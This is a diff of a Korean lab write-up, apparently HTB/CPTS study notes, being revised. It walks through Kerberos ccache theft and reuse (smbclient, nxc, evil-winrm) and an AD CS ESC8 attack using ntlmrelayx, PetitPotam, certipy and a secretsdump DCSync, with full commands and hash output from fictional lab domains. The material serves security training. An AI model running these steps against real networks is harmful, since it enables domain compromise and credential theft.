-그 이후 해시를 크랙하니 이처럼 Password4 라는 비번을 확보하게 되었다:
+추출된 RC4-HMAC/NT 해시를 크랙한 결과 `Password4` 라는 비밀번호를 확인할 수 있었다:
 
 ```bash
 $ hashcat -m 1000 '7247e8d4387e76996ff3f18a34316fdd' /usr/share/wordlists/rockyou.txt --show
@@ -448,15 +486,17 @@ $ hashcat -m 1000 '7247e8d4387e76996ff3f18a34316fdd' /usr/share/wordlists/rockyo
 7247e8d4387e76996ff3f18a34316fdd:Password4
 ```
 
-이를 통하여 또 다시 svc_workstations 유저로 ssh이동이 가능하였다.(sudo su - 를 이용하여 root로감)
+### Kerberos Credential Cache (ccache)
 
-그리고 방금 말한 ccache은 이미 발급받은 Kerberos 티켓 보관함이라고 보면 편하다.
+ccache는 `kinit` 등으로 이미 발급받은 Kerberos 티켓과 세션 키를 저장하는 Credential Cache이다.
 
-rebeus로 따지면 dump를 활용해 받아온 티켓이라고 볼수도 있고, 전 로그인할때 krbtgt로 만든 티켓을 보관하고있던 상태라고 보면 된다.
+Windows의 Kerberos 티켓 캐시에서 Rubeus로 티켓을 추출하는 것과 개념적으로 유사하지만, Keytab처럼 장기 키를 저장하는 파일과는 목적이 다르다.
 
-그리고 이 cchache는 대부분 Linux에서는 Kerberos 티켓 자체를 ccache 파일 형태로 /tmp에 저장한다.
+Linux의 Kerberos Credential Cache는 설정에 따라 FILE, KEYRING, KCM 등의 형태를 사용할 수 있다. 
 
-따라서 tmp를 보니 안본 친구(juilo) 이 새끼에 존재하는 티켓이 존재함을확인할수잇따:
+이 환경에서는 `/tmp` 에 `krb5cc_*` 형태의 FILE ccache가 저장되어 있었다.
+
+`/tmp` 를 확인하면 `julio` 소유의 ccache 파일이 존재하는 것을 확인할 수 있다:
 
 ```bash
 root@linux01:/tmp# ls -l
@@ -465,9 +505,9 @@ root@linux01:/tmp# ls -l
 -rw------- 1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Aug 20 06:00 krb5cc_647401106_zCP4vJ
 ```
 
-추가로 이 ccache 파일은 r 권한만 존재해도 사용이 가능하다.
+FILE 형식의 ccache는 파일을 읽을 수 있고 상위 디렉토리에 접근할 수 있다면 복사하거나 `KRB5CCNAME` 으로 지정해 사용할 수 있다.
 
-이 juilo가 어떤놈인지 자세히 보게되면 도메인 어드민이라고 쳐 적혀있다:
+`julio` 의 그룹 정보를 확인하면 `domain admins@inlanefreight.htb` 그룹에 포함되어 있어 도메인 관리자 계정임을 확인할 수 있다:
 
 ```bash
 root@linux01:/tmp# id julio@INLANEFREIGHT.HTB
@@ -475,13 +515,13 @@ root@linux01:/tmp# id julio@INLANEFREIGHT.HTB
 uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
 ```
 
-따라서 이 ccache 파일을 krb5 변수로 집어넣었따:
+이후 `KRB5CCNAME` 환경 변수에 `julio` 의 ccache 경로를 지정하였다:
 
 ```bash
 root@linux01:/tmp# export KRB5CCNAME=/tmp/krb5cc_647401106_zCP4vJ
 ```
 
-kilst를 보게되면 정상적으로 juilo 친구의 티켓으로 들어가있따:
+`klist` 를 확인하면 현재 기본 Credential Cache가 `julio@INLANEFREIGHT.HTB` 의 티켓으로 전환된 것을 확인할 수 있다:
 
 ```bash
 root@linux01:/tmp# klist
@@ -494,7 +534,7 @@ Valid starting       Expires              Service principal
         renew until 08/21/2026 05:59:37
 ```
 
-이를 토대로 //dc01 smb 통신을 활용하여 본 결과 정상적으로 접근에 성공하게된다:
+이 ccache를 사용해 DC01의 `C$` 공유에 접근하면 `julio` 의 Kerberos 권한으로 정상적으로 파일 목록을 확인할 수 있다:
 
 ```bash
 root@linux01:/tmp# smbclient //DC01/C$ -k -c ls -no-pass
@@ -516,15 +556,17 @@ root@linux01:/tmp# smbclient //DC01/C$ -k -c ls -no-pass
   Windows                             D        0  Mon Oct 10 10:48:55 2022
 ```
 
-또한 위 CCACHE를 로컬에 가져와서 klist에 저장시켜서 dc01에 들어갈수있게된다.
+### Reusing a ccache from Another Host
 
-우선 나의 로컬터미널에 넣었다:
+또한 ccache 파일을 Kali와 같은 다른 Linux 호스트로 복사한 뒤 `KRB5CCNAME` 으로 지정하여 재사용할 수 있다.
+
+로컬 터미널에서 가져온 ccache 파일을 다음과 같이 지정하였다:
 
 ```bash
 $ export KRB5CCNAME=$(pwd)/krb5cc_647401106_6O1tms
 ```
 
-klist를 확인해보면 정상적으로 들어간것을 확인할수있다:
+`klist` 를 확인하면 Kali에서도 `julio@INLANEFREIGHT.HTB` 의 TGT가 정상적으로 로드된 것을 확인할 수 있다:
 
 ```bash
 $ klist                                                           
@@ -536,7 +578,7 @@ Valid starting       Expires              Service principal
         renew until 08/21/2026 04:04:37
 ```
 
-/etc/hosts 파일을 넣고 이처럼 돌리게 되면 pwn3d가 뜬다:
+Kerberos는 SPN과 호스트 이름이 중요하므로 대상 FQDN이 올바르게 해석되도록 `/etc/hosts` 또는 DNS를 구성한 뒤 NXC에서 ccache를 사용할 수 있다:
 
 ```bash
 $ proxychains nxc smb dc01.INLANEFREIGHT.HTB --use-kcache
@@ -545,7 +587,7 @@ SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [*] Windows 10 / Serv
 SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [+] INLANEFREIGHT.HTB\julio from ccache (Pwn3d!)
 ```
 
-현재 도메인 어드민 관리자이기에 evil을 이용하여 접속에 시도할수있게된다:
+`julio` 가 Domain Admins에 속하므로 WinRM을 통한 원격 접속도 시도하였다:
 
 ```bash
 $ proxychains evil-winrm -i dc01.inlanefreight.htb -r INLANEFREIGHT.HTB
@@ -563,11 +605,15 @@ Cannot find KDC for realm "INLANEFREIGHT.HTB"
 Error: Exiting with code 1
 ```
 
-하지만 이런식으로 오류가 뜬다.
+### Configuring Kerberos KDC Discovery
 
-왜냐하면 현재 명시된 릴레이가 존재하지않아 INLANEFREIGHT.HTB 이새끼 서버 어딨냐? 를 못찾고있는 상태이기 때문이다.
+하지만 처음에는 다음과 같이 KDC를 찾지 못하는 오류가 발생하였다.
 
-따라서 krb5.conf 파일을 통하여 릴레이를 지정해주면 도메인이 알아서 가준다:
+이는 현재 Kerberos 클라이언트가 `INLANEFREIGHT.HTB` Realm에 사용할 KDC를 DNS나 로컬 설정을 통해 발견하지 못했기 때문이다.
+
+따라서 krb5.conf에 Realm과 KDC 매핑을 명시하면 Kerberos 클라이언트가 사용할 KDC를 찾을 수 있다. 
+
+NXC의 `--generate-krb5-file` 옵션으로 현재 환경에 맞는 설정 파일을 생성하였다:
 
 ```bash
 $ proxychains nxc smb dc01.INLANEFREIGHT.HTB --use-kcache --generate-krb5-file krb5.conf 
@@ -576,7 +622,7 @@ SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [*] Windows 10 / Serv
 SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [+] INLANEFREIGHT.HTB\julio from ccache (Pwn3d!)
 ```
 
-이렇게 되게되면 파일이 생성된것을 확인할수잇따:
+생성된 `krb5.conf` 의 내용은 다음과 같다:
 
 ```conf
 [libdefaults]
@@ -596,13 +642,13 @@ SMB         dc01.INLANEFREIGHT.HTB 445    DC01             [+] INLANEFREIGHT.HTB
     INLANEFREIGHT.HTB = INLANEFREIGHT.HTB
 ```
 
-이 릴레이 파일을 환경변수로 통해 설정해주었다:
+`KRB5_CONFIG` 환경 변수로 해당 파일을 사용하도록 지정하였다:
 
 ```bash
 $ export KRB5_CONFIG=$(pwd)/krb5.conf
 ```
 
-이후 다시 evil에 접속하면 성공적으로 접속하는데 성공하였다:
+이후 다시 Evil-WinRM에서 Kerberos 인증을 시도하면 정상적으로 `julio` 세션으로 접속할 수 있었다:
 
 ```bash
 $ proxychains evil-winrm -i dc01.inlanefreight.htb -r INLANEFREIGHT.HTB                 
@@ -610,5 +656,237 @@ $ proxychains evil-winrm -i dc01.inlanefreight.htb -r INLANEFREIGHT.HTB
 *Evil-WinRM* PS C:\Users\julio\Documents>
 ```
 
-## Pass the Certificate
+## Pass the Certificate (ESC8)
 
+### AD CS Web Enrollment and Template Enumeration
+
+AD CS(Active Directory Certificate Services) 환경에서는 인증서 기반 인증을 악용한 공격 경로도 존재한다. 
+
+ESC8은 인증서 템플릿 하나의 취약점이라기보다, NTLM Relay가 가능한 AD CS HTTP Web Enrollment 엔드포인트를 악용하는 기법이다.
+
+CA01의 웹 서버를 확인하면 `/CertSrv/` Web Enrollment 페이지가 노출되어 있음을 확인할 수 있다:
+
+![Password Attacks](/assets/cpts-infra/password-attacks-additional-techniques/pw-attacks7.png)
+
+이 페이지는 AD CS Web Enrollment를 통해 인증서 요청을 제출하고 발급 상태를 확인할 수 있는 엔드포인트이다.
+
+먼저 Certipy로 활성화된 인증서 템플릿과 권한을 열거하였다:
+
+```bash
+─$ certipy-ad find -u 'wwhite@INLANEFREIGHT.LOCAL' -p 'package5shores_topher1' -dc-ip 10.129.234.174 -enabled -stdout
+
+  3
+    Template Name                       : KerberosAuthentication
+    Display Name                        : Kerberos Authentication
+    Certificate Authorities             : inlanefreight-CA01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireDomainDns
+                                          SubjectAltRequireDns
+    Enrollment Flag                     : AutoEnrollment
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+                                          Smart Card Logon
+                                          KDC Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-04-28T17:11:06+00:00
+    Template Last Modified              : 2025-04-28T17:11:06+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : INLANEFREIGHT.LOCAL\Enterprise Read-only Domain Controllers
+                                          INLANEFREIGHT.LOCAL\Domain Admins
+                                          INLANEFREIGHT.LOCAL\Domain Controllers
+                                          INLANEFREIGHT.LOCAL\Enterprise Admins
+                                          INLANEFREIGHT.LOCAL\Enterprise Domain Controllers
+      Object Control Permissions
+        Owner                           : INLANEFREIGHT.LOCAL\Enterprise Admins
+        Full Control Principals         : INLANEFREIGHT.LOCAL\Domain Admins
+                                          INLANEFREIGHT.LOCAL\Enterprise Admins
+        Write Owner Principals          : INLANEFREIGHT.LOCAL\Domain Admins
+                                          INLANEFREIGHT.LOCAL\Enterprise Admins
+        Write Dacl Principals           : INLANEFREIGHT.LOCAL\Domain Admins
+                                          INLANEFREIGHT.LOCAL\Enterprise Admins
+        Write Property Enroll           : INLANEFREIGHT.LOCAL\Domain Admins
+                                          INLANEFREIGHT.LOCAL\Domain Controllers
+                                          INLANEFREIGHT.LOCAL\Enterprise Admins
+                                          INLANEFREIGHT.LOCAL\Enterprise Domain Controllers
+        Write Property AutoEnroll       : INLANEFREIGHT.LOCAL\Domain Controllers
+                                          INLANEFREIGHT.LOCAL\Enterprise Domain Controllers
+```
+
+### Understanding the KerberosAuthentication Template
+
+출력에서 이번 공격 흐름과 관련된 `KerberosAuthentication` 템플릿의 주요 속성을 정리하면 다음과 같다:
+
+```text
+Certificate Authorities       : inlanefreight-CA01-CA
+Enabled                       : True
+Client Authentication         : True
+
+Extended Key Usage
+  Client Authentication
+  Server Authentication
+  Smart Card Logon
+  KDC Authentication
+
+Enrollment Rights
+  Domain Controllers
+  Domain Admins
+  Enterprise Admins
+  Enterprise Domain Controllers
+  Enterprise Read-only Domain Controllers
+
+Requires Manager Approval     : False
+Authorized Signatures Required: 0
+
+Enrollee Supplies Subject     : False
+
+Certificate Name Flag
+  SubjectAltRequireDomainDns
+  SubjectAltRequireDns
+```
+
+`Certificate Authorities` 항목은 이 템플릿을 발급할 수 있는 발급 **CA(Issuing CA)** 를 나타낸다:
+
+```text
+Certificate Authorities       : inlanefreight-CA01-CA
+```
+
+`Client Authentication: True` 와 관련 EKU를 통해 이 템플릿으로 발급된 인증서를 클라이언트 인증에 사용할 수 있음을 확인할 수 있다:
+
+```text
+Client Authentication         : True
+```
+
+`Extended Key Usage` 는 해당 인증서를 어떤 인증 용도로 사용할 수 있는지 나타낸다:
+
+```text
+Extended Key Usage
+  Client Authentication
+  Server Authentication
+  Smart Card Logon
+  KDC Authentication
+```
+
+즉, 이 템플릿은 Client Authentication, Server Authentication, Smart Card Logon, KDC Authentication 등의 용도를 허용한다.
+
+또한 `Enrollment Rights` 에 `Domain Controllers` 가 포함되어 있으므로 DC01$과 같은 도메인 컨트롤러 컴퓨터 계정은 정상적으로 이 템플릿을 이용해 인증서를 등록할 권한이 있다.
+
+> 핵심은 CA01이 임의로 DC01의 인증서를 가져오는 것이 아니다. 공격자가 DC01$의 NTLM 인증을 AD CS Web Enrollment로 릴레이하면, Web Enrollment는 그 인증을 DC01$의 요청으로 받아들이고 Enrollment Rights가 허용하는 템플릿으로 인증서를 발급하게 된다.
+
+또한 `Enrollee Supplies Subject: False` 이므로 요청자가 임의의 Subject를 지정하는 방식은 허용되지 않는다:
+
+```text
+Enrollee Supplies Subject     : False
+```
+
+`SubjectAltRequireDomainDns` 와 `SubjectAltRequireDns` 는 도메인/컴퓨터 객체의 DNS 정보를 인증서 SAN에 포함하도록 하는 플래그이다:
+
+```text
+Certificate Name Flag
+  SubjectAltRequireDomainDns
+  SubjectAltRequireDns
+```
+
+따라서 이 시나리오의 핵심은 **DC01$이 등록 가능한 인증 템플릿**과 **NTLM Relay가 가능한 AD CS Web Enrollment 엔드포인트**가 함께 존재한다는 점이다.
+
+이 조건에서 DC01의 NTLM 인증을 공격자에게 강제로 발생시킨 뒤 CA Web Enrollment로 릴레이하면 DC01$의 인증서를 발급받는 ESC8 공격 흐름을 구성할 수 있다.
+
+### NTLM Relay to AD CS
+
+먼저 `ntlmrelayx` 를 AD CS Web Enrollment의 `certfnsh.asp` 엔드포인트에 연결하고, 릴레이된 인증으로 `KerberosAuthentication` 템플릿을 요청하도록 설정하였다:
+
+```bash
+$ impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+```
+
+이 상태에서 `ntlmrelayx` 는 공격자 호스트에서 들어오는 NTLM 인증을 기다리며, 인증을 수신하면 CA01의 Web Enrollment 엔드포인트로 전달한다.
+
+이후 PetitPotam을 사용해 DC01이 공격자 호스트로 NTLM 인증을 시도하도록 강제하였다:
+
+```bash
+$ python3 PetitPotam.py -u wwhite -p 'package5shores_topher1' -d INLANEFREIGHT.LOCAL 10.10.14.49 10.129.234.174
+
+[-] Connecting to ncacn_np:10.129.234.174[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+[+] OK! Using unpatched function!
+[-] Sending EfsRpcEncryptFileSrv!
+[+] Got expected
+```
+
+성공하면 DC01$의 SMB NTLM 인증이 공격자에게 들어오고, `ntlmrelayx` 가 이를 CA Web Enrollment로 릴레이하여 DC01$의 컨텍스트로 CSR을 제출한다. 
+
+그 결과 다음과 같이 `DC01.pfx` 인증서가 발급된다:
+
+```text
+[*] (SMB): Received connection from 10.129.234.174, attacking target http://10.129.234.172
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from INLANEFREIGHT/DC01$@10.129.234.174 against http://10.129.234.172 SUCCEED [1]
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Generating CSR...
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> CSR generated!
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Getting certificate...
+[*] (SMB): Received connection from 10.129.234.174, attacking target http://10.129.234.172
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from INLANEFREIGHT/DC01$@10.129.234.174 against http://10.129.234.172 SUCCEED [2]
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [2] -> Skipping user DC01$ since attack was already performed
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> GOT CERTIFICATE! ID 30
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
+[*] http://INLANEFREIGHT/DC01$@10.129.234.172 [1] -> Certificate successfully written to file
+```
+
+### Authenticating with the Issued Certificate
+
+발급된 `DC01.pfx` 는 DC01$의 인증서이므로 Certipy를 이용해 해당 컴퓨터 계정으로 인증할 수 있다.
+
+Certipy는 인증서를 이용한 PKINIT으로 TGT를 요청하고, 환경이 지원하면 이후 UnPAC-the-Hash 흐름을 통해 해당 계정의 NT 해시도 추출할 수 있다:
+
+```bash
+$ certipy-ad auth -pfx DC01.pfx -dc-ip 10.129.234.174 -username 'DC01$' -domain INLANEFREIGHT.LOCAL
+
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'DC01.inlanefreight.local'
+[*]     SAN DNS Host Name: 'inlanefreight.local'
+[*]     SAN DNS Host Name: 'INLANEFREIGHT'
+[*] Found multiple identities in certificate
+[*] Using identity: DNS Host Name: DC01.inlanefreight.local
+[*] Using principal: 'dc01$@inlanefreight.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc01.ccache'
+[*] Wrote credential cache to 'dc01.ccache'
+[*] Trying to retrieve NT hash for 'dc01$'
+[*] Got hash for 'dc01$@inlanefreight.local': aad3b435b51404eeaad3b435b51404ee:f31f567981e5619d88a672bf65271898
+```
+
+이처럼 DC01$의 NT 해시를 확보하였다. 
+
+도메인 컨트롤러 컴퓨터 계정은 디렉터리 복제를 수행하기 위한 권한을 가지므로, 해당 자격 증명으로 DCSync를 수행해 도메인 자격 증명을 복제할 수 있다:
+
+```bash
+$ impacket-secretsdump -hashes ':f31f567981e5619d88a672bf65271898' 'INLANEFREIGHT.LOCAL/DC01$'@10.129.234.174
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9cdc3e8cac76731c8827c85d9c256d06:::
+inlanefreight.local\jpinkman:1106:aad3b435b51404eeaad3b435b51404ee:9d995e5865f9dbfc701210466f0c78fe:::
+inlanefreight.local\wwhite:1107:aad3b435b51404eeaad3b435b51404ee:e831eef580eb72076cc36c43ee57bb95:::
+DC01$:1002:aad3b435b51404eeaad3b435b51404ee:f31f567981e5619d88a672bf65271898:::
+CA01$:1105:aad3b435b51404eeaad3b435b51404ee:4ef00b24e86de4a28ffdfc481797179b:::
+
+# SKIP
+```
